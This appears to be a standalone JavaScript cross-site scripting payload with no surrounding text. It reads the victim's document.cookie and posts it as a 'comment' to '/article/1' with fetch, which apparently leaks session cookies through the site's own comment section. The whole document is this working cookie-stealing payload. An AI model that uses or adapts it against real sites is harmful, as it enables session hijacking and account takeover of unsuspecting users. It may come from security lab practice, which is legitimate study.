var data = new FormData();

data.append('comment', document.cookie);

fetch('/article/1', {
    method: 'POST',
    mode: 'no-cors',
    body: data
})